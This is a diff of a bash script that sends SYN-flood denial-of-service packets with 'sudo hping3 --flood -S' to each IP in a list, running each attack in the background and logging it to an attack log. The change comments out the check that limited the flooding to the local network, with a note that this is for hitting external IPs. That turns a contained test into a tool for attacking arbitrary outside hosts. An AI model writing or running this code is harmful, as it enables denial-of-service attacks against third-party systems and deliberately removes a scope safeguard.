@@ -39,18 +39,20 @@ for IP in "${IPs[@]}"
 do
     ip_to_check=$IP
 
+    # Comment out or remove this block if checking external IPs
     # Check if the IP is within the local network
-    if ipcalc -n $network_info | grep -q "${ip_to_check%.*}.0"; then
-        log_file="${IP}_attack.log"
-        echo "Starting attack on $IP. Logging to $log_file."
-        
-        echo "Sending SYN packets to $IP from $network_info"
-        sudo hping3 -V --flood -S "$IP" &> "$log_file" &
-        pids+=($!)  # Capture the PID of the background process
-        echo "Attack on $IP initiated. Check $log_file for details."
-    else
-        echo "$ip_to_check is NOT in the local network."
-    fi
+    # if ipcalc -n $network_info | grep -q "${ip_to_check%.*}.0"; then
+
+    log_file="${IP}_attack.log"
+    echo "Starting attack on $IP. Logging to $log_file."
+    
+    echo "Sending SYN packets to $IP from $network_info"
+    sudo hping3 -V --flood -S "$IP" &> "$log_file" &
+    pids+=($!)  # Capture the PID of the background process
+    echo "Attack on $IP initiated. Check $log_file for details."
+    # else
+    #     echo "$ip_to_check is NOT in the local network."
+    # fi
 done
 
 # Wait for all background processes to finish
